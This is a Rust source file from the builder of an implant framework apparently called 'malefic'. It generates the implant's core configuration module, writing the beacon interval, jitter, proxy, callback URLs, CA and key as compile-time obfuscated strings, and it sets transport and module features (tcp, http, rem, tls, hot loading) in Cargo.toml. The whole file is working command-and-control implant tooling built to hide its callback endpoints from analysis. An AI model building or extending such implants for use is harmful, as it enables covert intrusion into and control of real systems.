use super::config_3rd::update_3rd_toml;
use crate::{log_step, log_success};
use crate::{BasicConfig, ImplantConfig, FEATURES};
use lazy_static::lazy_static;
use std::fs;
use std::fs::File;
use std::io::Write;
use toml_edit::{Array, DocumentMut};

static CONFIG_FILE_GENE_PATH: &str = "malefic-core/src/config/mod.rs";
static CONFIG_CORE_TOML_PATH: &str = "malefic-core/Cargo.toml";

lazy_static! {
    static ref CONFIG_CORE_PATH: String = "malefic-core/src/config/mod.rs".to_string();
}

pub fn update_core_config(server: &BasicConfig, _implant_config: &ImplantConfig) {
    log_step!("Updating core configuration...");
    let mut file = File::create(CONFIG_FILE_GENE_PATH.to_string()).unwrap();

    let urls_str: String = server
        .targets
        .iter()
        .map(|url| format!("\t\tobfstr::obfstr!(\"{}\").to_string(),\n", url))
        .collect();

    let ca_str = if server.ca.is_empty() {
        "".to_string()
    } else {
        format!("include_bytes!(\"{}\")", server.ca)
    };

    // 生成基础配置
    let mut base_config = format!(
        r#"use lazy_static::lazy_static;

lazy_static! {{
    pub static ref INTERVAL: u64 = {interval};
    pub static ref JITTER: f64 = {jitter} as f64;
    pub static ref NAME: String = obfstr::obfstr!("{name}").to_string();
    pub static ref PROXY: String = obfstr::obfstr!("{proxy}").to_string();
    pub static ref URLS: Vec<String> = vec![
{urls}      ];
    pub static ref CA: Vec<u8> = obfstr::obfstr!("{ca}").into();
    pub static ref KEY: Vec<u8> = obfstr::obfstr!("{key}").into();
"#,
        interval = server.interval,
        jitter = server.jitter,
        name = server.name,
        proxy = server.proxy,
        urls = urls_str,
        ca = ca_str,
        key = server.key,
    );
    if server.protocol == "http" {
        base_config.push_str(&format!(
            r#"    pub static ref HTTP: String = obfstr::obfstr!("{http}").to_string();
            "# , http = server.http.clone().build(0)
        ));
    }
    if server.protocol == "rem" {
        base_config.push_str(&format!(
            r#"    pub static ref REM: String = obfstr::obfstr!("-m proxy -l memory+socks://:@memory -c {rem}").to_string();
            "# , rem = server.rem.link
        ));
    }
    base_config.push_str("}");
    file.write_all(base_config.as_bytes())
        .expect("write config file error");

    log_success!("Core configuration has been updated successfully");
}

pub fn update_core_toml(server: &BasicConfig, implant: &ImplantConfig) {
    log_step!("Updating core Cargo.toml...");
    let cargo_toml_content =
        fs::read_to_string(CONFIG_CORE_TOML_PATH).expect("Failed to read Cargo.toml file");

    let mut cargo_toml: DocumentMut = cargo_toml_content
        .parse()
        .expect("Failed to parse Cargo.toml file");

    if let Some(features) = cargo_toml[&FEATURES].as_table_mut() {
        let mut default_feature = Array::new();
        if implant.hot_load {
            default_feature.push("hot_load".to_string());
        }

        if implant.register_info {
            default_feature.push("register_info".to_string());
        }
        
        match server.protocol.as_str() {
            "tcp" => {
                default_feature.push("transport_tcp".to_string());
            }
            "http" => {
                default_feature.push("transport_http".to_string());
            }
            "rem" => {
                default_feature.push("transport_rem".to_string());
            }
            _ => {}
        }
        if server.tls {
            default_feature.push("tls".to_string());
        }

        // 处理第三方模块配置
        if implant.enable_3rd {
            default_feature.push("malefic-3rd".to_string());
            // 更新 malefic-3rd 的 Cargo.toml
            update_3rd_toml(&implant.third_modules);
        }

        features["default"] = toml_edit::Item::Value(default_feature.into());
    }
    fs::write(CONFIG_CORE_TOML_PATH, cargo_toml.to_string())
        .expect("Failed to write updated Cargo.toml file");
    log_success!(
        "Core Cargo.toml has been updated at {}",
        CONFIG_CORE_TOML_PATH
    );
}
